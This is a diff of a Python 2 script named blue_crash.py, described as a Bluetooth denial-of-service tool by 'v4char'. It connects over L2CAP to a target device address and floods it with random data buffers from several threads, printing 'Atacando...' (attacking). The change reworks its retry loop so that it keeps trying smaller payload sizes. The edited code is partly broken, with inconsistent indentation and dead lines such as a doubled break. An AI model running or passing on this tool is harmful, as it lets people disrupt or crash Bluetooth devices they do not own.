@@ -9,10 +9,10 @@ import threading
 import random
 import string
 
-caracteres = 1200
+caracteres = 750
 
 print "\n\nScript DOS bluetooth by v4char"
-print "Se paciente puede tardar un poco\n"
+print "Se paciente puede tardar un poco"
 
 if len(sys.argv) >= 3:
 
@@ -39,20 +39,24 @@ if len(sys.argv) >= 3:
          t.start()
 
    def obtener_longitud():
-		global caracteres
-		try:
-			s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
-			s.connect((sys.argv[1] ,3))
-			s.connect((sys.argv[1] ,3))
-			buff = (generar(8).decode("hex"))*caracteres
-			s.send(buff)
-			s.close
-			print "Atacando..."
-			main(int(sys.argv[2]))
-		except:
-			caracteres = caracteres - 1
-	obtener_longitud()
+      global caracteres
+      while 1:
+         try:
+            s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
+            s.connect((sys.argv[1] ,3))
+            buff = (generar(8).decode("hex"))*caracteres
+            s.send(buff)
+            s.close
+            print "Atacando...\nCaracteres: "+str(caracteres)
+            main(int(sys.argv[2]))
+         except:
+            caracteres = caracteres - 1
+				if (caracteres <= 1):
+					break
+					break
+					sys.exit
 
+   obtener_longitud()
 
 else:
    print "Error usa \"python blue_crash.py bt_mac hilos\"\n";
